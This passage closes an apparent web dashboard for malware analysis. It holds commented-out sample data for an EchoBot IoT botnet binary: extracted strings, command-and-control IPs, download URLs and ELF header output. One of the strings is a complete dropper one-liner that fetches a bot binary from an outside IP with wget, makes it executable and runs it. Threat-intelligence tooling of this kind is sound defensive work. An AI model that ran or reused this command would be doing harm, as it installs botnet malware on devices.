      //       "HuaweiHomeGateway",
      //       "/etc/init.d/",
      //       "/etc/crontab",
      //       "rm -rf",
      //       "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.8.80.2/bins/ECHOBOT.MIPS; chmod 777 ECHOBOT.MIPS; ./ECHOBOT.MIPS mips",
      //       "bins/ECHOBOT.arm7",
      //       "bins/ECHOBOT.x86",
      //       "bins/ECHOBOT.ppc",
      //       "bash",
      //       "/proc/net/tcp",
      //       "/dev/watchdog",
      //       "/etc/rc.d/",
      //       "SYN flood"
      //     ],
      //     "network_indicators": {
      //       "ips": ["185.8.80.2", "103.116.47.13", "91.92.66.182"],
      //       "urls": [
      //         "http://185.8.80.2/bins/ECHOBOT.MIPS",
      //         "http://185.8.80.2/bins/ECHOBOT.arm7",
      //         "http://185.8.80.2/bins/ECHOBOT.x86",
      //         "http://185.8.80.2/bins/ECHOBOT.ppc"
      //       ]
      //     },
      //     "elf_metadata": {
      //       "header": [
      //         "ELF Header:",
      //         "  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00",
      //         "  Class:                             ELF32",
      //         "  Data:                              2's complement, big endian",
      //         "  Version:                           1 (current)",
      //         "  OS/ABI:                            UNIX - System V",
      //         "  ABI Version:                       0",
      //         "  Type:                              EXEC (Executable file)",
      //         "  Machine:                           MIPS R3000",
      //         "  Version:                           0x1",
      //         "  Entry point address:               0x400790",
      //         "  Start of program headers:          52 (bytes into file)",
      //         "  Start of section headers:          5200 (bytes into file)",
      //         "  Flags:                             0x50001007, noreorder, pic, cpic, o32, mips32",
      //         "  Size of this header:               52 (bytes)",
      //         "  Size of program headers:           32 (bytes)",
      //         "  Number of program headers:         8",
      //         "  Size of section headers:           40 (bytes)",
      //         "  Number of section headers:         28",
      //         "  Section header string table index: 25",
      //         "  File is statically linked and stripped"
      //       ],
      //       "sections": [
      //         "There are 28 section headers, starting at offset 0x1450:",
      //         "",
      //         "Section Headers:",
      //         "  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al",
      //         "  [ 0]                   NULL            00000000 000000 000000 00      0   0  0",
      //         "  [ 1] .reginfo          MIPS_REGINFO    00400094 000094 000018 18   A  0   0  4",
      //         "  [ 2] .text             PROGBITS        004000b0 0000b0 00ae40 00  AX  0   0 16",
      //         "  [ 3] .rodata           PROGBITS        0040aef0 00aef0 0017a8 00   A  0   0 16",
      //         "  [ 4] .eh_frame         PROGBITS        0040c698 00c698 0000f8 00   A  0   0  4",
      //         "  [ 5] .MIPS.abiflags    MIPS_ABIFLAGS   0040c790 00c790 000018 18   A  0   0  8",
      //         "  [ 6] .data             PROGBITS        0041c7b0 00c7b0 0003b0 00  WA  0   0 16",
      //         "  [ 7] .sdata            PROGBITS        0041cb60 00cb60 000070 00  WA  0   0 16",
      //         "  [ 8] .bss              NOBITS          0041cbd0 00cbd0 004c20 00  WA  0   0 16",
      //         "  [ 9] .pdr              PROGBITS        00000000 00cbd0 000000 00      0   0  4",
      //         "  [10] .gnu.attributes   GNU_ATTRIBUTES  00000000 00cbd0 000010 00      0   0  1",
      //         "  [11] .symtab           SYMTAB          00000000 00cbe0 004d50 10     12 921  4",
      //         "  [12] .strtab           STRTAB          00000000 011930 002a0c 00      0   0  1"
      //       ]
      //     }
      //   };
        
      //   // In a real app, this would be replaced with file loading logic
      //   setTimeout(() => {
      //     loadingDiv.style.display = 'block';
          
      //     setTimeout(() => {
      //       populateDashboard(sampleData);
      //       loadingDiv.style.display = 'none';
      //       dashboardContent.style.display = 'block';
      //     }, 800);
      //   }, 200);
      // });
    });
  </script>
</body>
</html>